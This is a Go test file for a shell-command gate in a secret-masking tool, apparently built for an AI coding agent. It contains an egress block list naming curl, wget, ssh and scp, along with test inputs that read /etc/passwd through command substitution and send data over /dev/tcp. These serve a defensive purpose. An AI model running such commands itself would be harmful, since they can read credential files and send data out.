package claudecode

import (
	"strings"
	"testing"

	"github.com/pratikbin/opensecretmask/internal/core/store"
	"github.com/stretchr/testify/require"
)

func defaultBashCfg() store.BashConfig {
	return store.BashConfig{
		DefaultDecision: "ask",
		EgressBlocklist: []string{
			"curl", "wget", "ssh", "scp",
			"git push", "git pull", "git fetch", "git clone",
			"npm publish", "docker push",
			"kubectl exec", "kubectl apply",
		},
		LocalAllowlist: []string{
			"cat", "echo", "ls", "grep", "rg",
			"git status", "git diff", "git log",
			"npm test", "npm run", "make",
		},
		TreatPipeAsAsk:      true,
		TreatRedirectAsAsk:  true,
		TreatSubshellAsDeny: true,
	}
}

func TestBashGate_Classify(t *testing.T) {
	cases := []struct {
		name         string
		cmd          string
		replacements int
		want         BashDecision
		reasonSub    string
	}{
		{"skip when no replacements", "sk_live_xyz", 0, BashSkip, ""},
		{"allowlist cat", "cat foo.txt", 1, BashAllow, "allowlisted"},
		{"allowlist git status", "git status", 1, BashAllow, "allowlisted"},
		{"deny git push", "git push origin main", 1, BashDeny, "blocked"},
		{"deny curl", "curl https://x.y/z", 1, BashDeny, "blocked"},
		{"deny curl inside bash -c", "bash -c 'curl https://x.y'", 1, BashDeny, "blocked"},
		{"ask on pipe", "cat foo.txt | grep bar", 1, BashAsk, "pipe"},
		{"ask on redirect", "cat foo.txt > out.txt", 1, BashAsk, "redirect"},
		{"deny cmd substitution", "echo $(cat /etc/passwd)", 1, BashDeny, "substitution"},
		{"deny eval", "eval some_var", 1, BashDeny, "eval"},
		{"deny dot operator", ". ./script.sh", 1, BashDeny, "."},
		{"deny source", "source ./script.sh", 1, BashDeny, "source"},
		{"deny /dev/tcp", "echo hello > /dev/tcp/1.2.3.4/80", 1, BashDeny, "/dev/tcp"},
		{"deny npm publish", "npm publish", 1, BashDeny, "blocked"},
		{"deny docker push", "docker push myimg", 1, BashDeny, "blocked"},
		{"ask default unknown", "unknown_cmd --flag", 1, BashAsk, "default"},
		{"allowlist npm test", "npm test", 1, BashAllow, "allowlisted"},
	}
	g := NewBashGate(defaultBashCfg())
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dec, reason := g.Classify(tc.cmd, tc.replacements)
			require.Equal(t, tc.want, dec, "decision mismatch; reason=%q", reason)
			if tc.reasonSub != "" {
				require.True(t, strings.Contains(reason, tc.reasonSub),
					"reason %q does not contain %q", reason, tc.reasonSub)
			}
		})
	}
}

func TestBashGate_DefaultDecisionAllow(t *testing.T) {
	cfg := defaultBashCfg()
	cfg.DefaultDecision = "allow"
	g := NewBashGate(cfg)
	dec, _ := g.Classify("unknown_cmd --flag", 1)
	require.Equal(t, BashAllow, dec)
}

func TestBashGate_DefaultDecisionDeny(t *testing.T) {
	cfg := defaultBashCfg()
	cfg.DefaultDecision = "deny"
	g := NewBashGate(cfg)
	dec, _ := g.Classify("unknown_cmd --flag", 1)
	require.Equal(t, BashDeny, dec)
}

func TestBashGate_ParseErrorFallsBackToAsk(t *testing.T) {
	g := NewBashGate(defaultBashCfg())
	// Unclosed quote → parse error.
	dec, reason := g.Classify("echo 'unterminated", 1)
	require.Equal(t, BashAsk, dec)
	require.Contains(t, reason, "parse error")
}
